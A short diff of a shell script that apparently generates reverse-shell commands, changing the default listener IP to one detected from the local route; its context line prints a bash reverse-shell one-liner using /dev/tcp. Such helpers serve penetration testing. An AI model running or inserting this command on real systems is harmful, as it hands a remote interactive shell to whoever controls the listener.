@@ -15,7 +15,7 @@ fi
 
 if [ -z "$ip_addr" ]
 then
-	ip_addr="192.168.1.1"
+	ip_addr="$(ip route get 1.1.1.1 | sed 's/.*src \([0-9.]\+\).*/\1/;q')"
 fi
 
 echo -e "\e[41m[bash]\e[0m bash -i >& /dev/tcp/$ip_addr/$port 0>&1"
